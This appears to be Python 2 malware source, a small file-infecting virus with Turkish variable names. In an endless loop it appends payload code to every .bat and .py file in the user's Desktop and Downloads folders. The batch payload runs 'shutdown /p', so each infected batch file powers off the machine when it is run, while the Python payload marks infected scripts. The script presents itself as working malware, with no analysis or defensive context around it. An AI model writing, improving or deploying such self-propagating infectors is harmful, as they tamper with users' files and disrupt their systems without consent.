#-*-coding:cp1254-*-
import os
import sys
import time

PATH = os.path.abspath("")


SIGNATURE_py = """#-*-coding:cp1254-*-
import os
import time
os.system("echo hi")
time.sleep(10)"""

SIGNATURE_bat = """@echo off
shutdown /p
pause """

def redkit(path):
    os.chdir(path)
    files =os.listdir(path)
    for fname in files:
        if fname[-3:] == "bat":
             dosya=open(fname).read()
             if SIGNATURE_bat not in dosya:
                 dosya =open(fname,"a")
                 dosya.write(SIGNATURE_bat)
                 dosya.close()
             else:
                   print "Success !"
                   print
                   time.sleep(1)
        

        if fname[-3:] == ".py":
            dosya=open(fname).read()
            if SIGNATURE_py not in dosya:
                dosya = open(fname,"a")
                dosya.write(SIGNATURE_py)
                dosya.close()
            else:
                   print "Success !"
                   print
                   time.sleep(1)

      
print "Listening ..."
while True:
    
    if PATH[-7:] == "Desktop":
        CLEAR = PATH[:-7]
        DESK = CLEAR + "Desktop"
        DOWNLOADS = CLEAR + "Downloads"
        redkit(os.path.abspath(DESK))
        redkit(os.path.abspath(DOWNLOADS))
    if PATH[-9:] == "Downloads":
        CLEAR = PATH[:-9]
        DOWNLOADS = CLEAR + "Downloads"
        DESK = CLEAR + "Desktop"
        redkit(os.path.abspath(DESK))
        redkit(os.path.abspath(DOWNLOADS))
    
    
    
